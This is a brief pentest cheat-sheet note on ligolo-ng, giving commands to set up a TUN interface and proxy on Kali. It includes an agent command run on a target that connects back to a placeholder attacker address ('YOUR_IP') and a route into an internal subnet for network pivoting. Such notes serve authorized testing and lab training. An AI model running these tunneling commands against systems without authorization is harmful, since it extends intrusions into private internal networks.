---
tags: [tool, pivoting]
tool: ligolo-ng
category: Pivoting
installed: true
---

# Ligolo-ng - Advanced Tunneling

## Overview
Create TUN interfaces for seamless network pivoting

## Location
/usr/bin/ligolo-proxy
/usr/bin/ligolo-agent

## Usage

### On Kali (Proxy)
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
ligolo-proxy -selfcert -laddr 0.0.0.0:11601

### On Target (Agent)
./ligolo-agent -connect YOUR_IP:11601 -ignore-cert

### In Proxy Console
session
ifconfig
start

### Add Route (Kali)
sudo ip route add 10.10.10.0/24 dev ligolo
